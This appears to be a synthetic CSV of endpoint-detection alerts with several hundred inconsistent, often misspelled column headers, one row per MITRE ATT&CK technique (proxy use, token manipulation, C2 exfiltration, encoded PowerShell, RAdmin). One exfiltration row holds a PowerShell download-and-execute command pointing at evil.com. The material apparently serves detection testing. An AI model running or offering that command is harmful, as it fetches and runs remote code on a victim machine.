AlertID,AlertTimestamp,MachineId,ComputerName,Severity,AlertName,AlertType,Category,AlertDescription,Status,ExtendedProperties,event_id,event_type,event_timestamp,event_category,severity,detect_description,detect_id,technique,device_name,file_name,file_size,src_path,dst_path,user_name,process_name,AlertSeverity,Recommendation,RuleName,Source,Tactic,Technique,AlertCategory,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,DetectionId,event_description,Details,EndpointID,EndpointName,ParentProcessName,ParentProcessPath,ProcessPath,host,user,process,network,detection,FallbackProtocol,DestinationIP,DestinationPort,artifact_hiding,security_control_disablement,Event,Host,User,Action,Reason,event_time,alert_rule_name,technique_name,tactic,process_id,command_line,destination_ip,destination_port,source_ip,source_port,ProcessId,DestinationIp,SourceIp,SourcePort,AlertTimestamps,file_path,file_hash,process_hash,parent_process_name,parent_process_hash,registry_modification,subtype,recommendation,detection_details,product,mitre,endpoint,attack_details,event_severity,protocol,process_command_line,parent_process_command_line,parent_process_id,SourceIP,Protocol,ProcessCommandLine,ParentProcessCommandLine,event_categfory,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,alert_severity,action_taken,detection_source,ProcessHash,ProcessParentName,ProcessParentPath,ProcessParentHash,tactics,affected_entities,recommendations,source,destination,threat_severity,threat_category,threat_name,indicators,ioc,description,Description,Endpoint,DetectionSource,AlertyDescription,MACAddress,EventLogName,EventLogMessage,AdditionalInfo,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,DetectionMethod,RecommendedActions,event_catefory,affected_hosts,event_details,event_name,alert_type,event,Field,Operator,Value,Tags,RegistryKey,RegistryValue,type,timestamp,Title,Affected_Image_Path,Timestamp,Injected_Process_Name,Loader_Process_Name,Loader_Technique,event_Source,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,EntityName,EntityType,Hostname,event_version,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,detection_method,AlertNmae,IP,OS,category,action,event_data,data,ArtifactType,ArtifactPath,ArtifactName,sensor_id,customer_id,event_info,AffectedHostname,AffectedFile_Path,AlertSource,Parent_Process_Name,Injection_Technique,technique_id,subtechnique_id,subtechnique,additional_info,vendor,path,domain,ip_address,Name,event_subtype,src_ip,dst_ip,container_name,image_name,image_digest,registry,command,process_path,username,actor,host_info,event_url,event_hash,event_action,event_source,OperatingSystem,web_server_url,web_server_method,AssignedTo,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DomainName,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,OSVersion,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName,trigger,remediation,metadata,process_injection,ControlName,file_write,actions,alert_data,tags,Type,Condition,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,Affected_Device,Affected_User,Malicious_Executable,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,rule_name,hostname,ip,process_pid,files,MachineName,sha1_hash,local_ip,public_ip,malware_family,org_id,event_event_name,kill_chain_phases,data_source,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,parent_process_pid,c2,native_function_calls,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,TimestampUtc,SHA256,WebServiceName,WebServicePath,file,parent_process,os,pid,access_type,operation,InjectedProcessName,InjectionTechnique,AleertDescription,AlertDetails,mitre_technique,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentID,Detection_Details,Process_Path,Process_Command_Line,AffectedImagePath,machine_id,user_id,alert_name,remote_address,remote_port,local_address,local_port,AlertId,RemoteServer,ParentCommandLine,EventID,Hash,ParentHash,ExecutionStatus,event_cagtegory,remediation_steps,AffectedHostInfo,DetectionDetails,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,Path,HostIP,KillChain,EndpointDetails,detected_by,details,device,TargetUser,OriginalPermissions,NewPermissions,cloud_infrastructure_modification,CloudProvider,APIOperation,evebnt_category,EntityValue,creationTimeUtc,status,recommendedActions,vendorInformation,properties,src_port,remote_ip,Target,Port,AffectedEndpoints,IndicatorsOfCompromise,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,file_permission_modification,Product,AttackType,AttackDuration,AffectedServices,EventTime,application,threat,affected_host,alert_category,alert_recommendation,alert_details,References,target,attack_name,affected_process,affected_file_path,recommended_actions,host_name,md5_hash,sha256_hash,AlertTimestampUtc,EventId,WebServerUrl,WebServerMethod,process_execution,event_ category,detect_name,rule_description,triggered_rule,remote_server,CloudAccount,endpoint_id,web_service_name,web_service_path,ProcessParentCommandLine,AttackVector,alert_rule_id,alert_state,alert_time,src,process_tree,ioc_type,ioc_value,process_details,host_details,file_info,network_info,email_sender,email_recipient,email_subject,email_urls,email_attachments,ip_addresses,mac_addresses,operating_system,agent_version,group_name,Vendor,Username,name,event_creator,mitre_attack_id,cloud_account,detection_info,URL,file_deletion,AttackTactic,AttackTechnique,EntityId,EntityIp,MachineDomainName,AlertLink,AlertTime,UserInfo,PhishingInfo,DetectionID,EventHash,AffectedEntities,KillChainPhase,RemediationSteps,Alertescription,modified_time,original_hash,current_hash,event)category
1234567,2023-03-09T15:45:00Z,,,High,Proxy Connection,Endpoint detection,,Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Network Traffic,,,,,,,,,,,Proxy Detection,"['Investigate the use of a proxy in the environment', 'Identify the source and destination of the proxy traffic', 'Monitor for any further suspicious activity']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,12345,threat_detection,1646749633000,Access Token Manipulation Detected,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Access Token Manipulation has been detected on endpoint.,,,,,,,"{'hostname': 'endpoint1', 'ip': '192.168.1.100', 'os': 'Windows 10 Pro', 'user': 'JohnDoe'}",,,,,,,,,,,,,,,2023-03-10T12:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint Detection and Response,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Access Token Manipulation (T1134),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0303345,2022-04-05T08:32:15Z,,,High,Possible deployment of unauthorized container on host,,,This alert is triggered when an attempt to deploy an unauthorized container is detected on a host.,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,Deploy Container,Container Security,Host01,/usr/bin/docker,,docker run -itd unauthorized-image:latest,,,,,,,,,,,,,,,,,,,,,,,,,,,john.doe,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,unauthorized-image:latest,Docker,docker run,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0009090,2023-03-08T14:30:00Z,,,High,Exfiltration Over C2 Channel Detected,,,This alert is triggered when data exfiltration is detected over a Command and Control (C2) channel on an endpoint.,,,,,,,,,,,,,,,,,,,,,,,,,,,powershell.exe,,,,,JohnDoe,1234,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'),,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,evil.com,SensitiveData.txt,HTTP,DOMAIN,5678,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
pr4p5-f,,,,High,Native API,,System Call,Defender for Endpoint has detected suspicious use of a Native API on the system.,,,,,,,,,,,,,,,,,,,Analyze the system for any suspicious activities or processes and block the process that was making the suspicious call.,,,,Native API (T1106),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"Defender for Endpoint detected a process using a Native API function to interact with the operating system. The API function is commonly used by malware to execute commands or perform actions on the system, and can be an indicator of malicious activity.",C:\Windows\explorer.exe,"explorer.exe /root,C:\Windows\system32",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3-04-5-ft5,2023-03-10T12:00:00Z,,,Critical,Pre-OS Boot,,,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system.",,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the pre-OS boot image to determine the nature and purpose of the modification.,,,Persistence,Pre-OS Boot,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\bootmgr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
defender_endpoint_alert_12345,2022-01-01T12:34:56.789Z,,,,RAdmin Tool Used to Remotely Control Workstations,,,Remote access tools (RAdmin) may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,TCP,C:\Program Files (x86)\RAdmin Viewer\rview.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,RAdmin Tool Used,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,machine-12345,user-67890,RAdmin Tool Used to Remotely Control Workstations,192.168.1.100,4899,192.168.1.101,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,2023-03-08T14:30:00Z,,,Medium,Scheduled Transfer,,,"This alert is triggered when a file transfer occurs, which may indicate scheduled transfer activity. This could be an indication of malicious activity, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,robocopy C:\LocalFolder \\RemoteServer\Share /E,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678-1234-1234-1234-123456789012,\\RemoteServer\Share,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0pd0d03wr,2023-03-03T10:15:30Z,,,,Serverless Execution,,,Potential serverless execution detected via PowerShell execution with encoded command.,,,,,,,,,,,,,,,,,,High,,,,Execution,Serverless Execution,,,,powershell.exe,-EncodedCommand,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Process Creation,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,powershell.exe -encodedCommand,4688,9D73B2CF2A1C728FE8B282FDC7EE5DE5,2E20D26F9C1ACB5547D5BDA70FEBD054,Blocked,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,040t0y0,treaffic signaling,2023-03-09T12:30:00Z,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CrowdStrike Falcon has detected unusual network traffic on the endpoint that could be indicative of traffic signaling activity.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'EXAMPLE-HOSTNAME', 'ip_address': '192.168.0.100', 'operating_system': 'Windows 10'}",,,,,,,,,,,,,,,,,,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unusual network traffic detected,"['Isolate the affected endpoint from the network', 'Terminate any suspicious processes or connections', 'Scan the endpoint for malware or signs of compromise', 'Patch any known vulnerabilities in the endpoint or software applications']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,High,,,Detection,,,,12345,alert,1646749655000,User Execution Detected,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,User attempted to execute a potentially malicious file.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2022-04-01T10:30:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345,,,,,,"{'Hostname': 'PC123', 'IPAddress': '192.168.1.100', 'OS': 'Windows 10'}","{'FilePath': 'C:\\Users\\User1\\Downloads\\malware.exe', 'Hash': 'abc123def456', 'Signer': 'Unknown', 'CommandLine': 'C:\\Users\\User1\\Downloads\\malware.exe', 'ParentProcess': {'Name': 'explorer.exe', 'PID': '1234', 'Path': 'C:\\Windows\\explorer.exe'}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
82940f,2022-04-01T10:30:00Z,,,High,User Execution,,,"While User Execution frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after Internal Spearphishing.",,,,,,,,,,,,,,,,,,,,,,,,,,C:\Users\User1\Downloads\malware.exe,,C:\Users\User1\Downloads\malware.exe,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,PC123,,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,abc123def456,,,,,,,User Execution,Execution,Unknown,explorer.exe,1234,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
222221,2022-03-03T13:42:17Z,,,High,Unusual Parent Process,,Command and Scripting Interpreter (T1059.003),A suspicious parent child process relationship with cmd.exe descending from an unusual process was detected.,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,cmd.exe,cmd.exe /c echo 'Hello World',,,,JohnDoe,,,,,,,,MyCustomProcess.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,EDR,,,,,"{'ParentProcessName': 'MyCustomProcess.exe', 'ParentProcessPath': 'C:\\Program Files\\MyApp\\MyCustomProcess.exe', 'ParentProcessCommandLine': 'MyCustomProcess.exe /run'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Command and Scripting Interpreter,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,['Command and Scripting Interpreter'],,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,EDR-T1609-1234567890,container_administration_command,,intrusion_detection,high,,,T1609,,,,,,,,,,,,,,,,,,,,,,,,,,A container administration command was detected on the endpoint,,,,,,,,,,,,,,,,,,,,,,2022-03-15T14:31:00Z,,,defense_evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'Endpoint-001', 'ip_address': '192.168.1.100'}","{'hostname': 'Container-001', 'ip_address': '192.168.1.200'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,1234567890,,,,,,,,,,,,,,,,,,,,,,,docker exec -it <container_id> /bin/bash,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0944444,2023-03-08T09:00:00Z,,,High,Data Encoding,,Endpoint,Adversaries may encode data to make the content of command and control traffic more difficult to detect.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'ProcessName': 'notepad.exe', 'ProcessPath': 'C:\\Windows\\system32\\notepad.exe', 'CommandLine': 'notepad.exe C:\\Users\\User1\\Desktop\\encoded.txt', 'ParentProcessName': 'explorer.exe', 'ParentProcessPath': 'C:\\Windows\\explorer.exe', 'EncodingType': 'Base64', 'EncodedData': 'SGVsbG8gV29ybGQh'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'Hostname': 'Endpoint1', 'IPAddress': '192.168.1.10', 'MACAddress': '00-0C-29-56-A7-34', 'OS': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
